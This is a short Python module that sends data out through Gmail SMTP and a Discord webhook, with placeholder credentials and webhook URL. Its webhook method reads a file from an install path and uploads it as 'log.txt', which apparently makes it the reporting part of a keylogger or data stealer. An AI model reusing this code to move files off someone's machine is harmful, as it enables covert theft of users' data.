import smtplib, ssl
from discord_webhook import DiscordWebhook

class Mail:
    def __init__(self):
        self.port = 465
        self.smtp_server_domain_name = "smtp.gmail.com"
        self.sender_mail = "null@gmail.com"
        self.password = "null"
    def send(self, emails, subject, content):
        ssl_context = ssl.create_default_context()
        service = smtplib.SMTP_SSL(self.smtp_server_domain_name, self.port, context=ssl_context)
        service.login(self.sender_mail, self.password)
        for email in emails:
            result = service.sendmail(self.sender_mail, email, f"Subject: {subject}\n{content}")
        service.quit()

class Send:
    def Gmail(email, subject, data):
        mails=str(email).split()
        subject=subject
        content=str(data)
        print(content)
        mail = Mail()
        mail.send(mails, subject, content)
        print("Sent")
    def Webhook(subject, install_path, filename):
        webhook_url=str("Your Webhook")
        constructed_data=str(f"""
```
{subject}
```
        """)
        webhook = DiscordWebhook(url=str(webhook_url),
        content=str(constructed_data),
        rate_limit_retry=True,
        username=f"Webhook With Files"
        )
        with open(f"{install_path}\\{filename}", "r") as f:
            webhook.add_file(file=f.read(), filename=f"log.txt")
        response = webhook.execute()
